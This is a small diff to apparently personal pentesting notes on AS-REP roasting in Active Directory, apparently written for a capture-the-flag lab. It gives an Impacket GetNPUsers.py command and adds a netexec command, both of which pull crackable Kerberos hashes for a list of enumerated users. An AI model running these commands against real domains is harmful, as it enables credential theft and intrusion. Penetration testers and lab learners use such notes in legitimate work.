@@ -1,3 +1,5 @@
 1. If you can find valid users through enum, sid-bruting, or rid-bruting try as-rep roasting.
 
 2. use this command == GetNPUsers.py '<DOMAIN-DOMAIN.DOMAIN/> "ex. EGOTISTICAL-BANK.LOCAL/"' -usersfile users.txt -format hashcat -outputfile hashes.aspreroast -dc-ip <dcip>
+
+netexec kerberos <target_ip> -u users.txt --asreproast
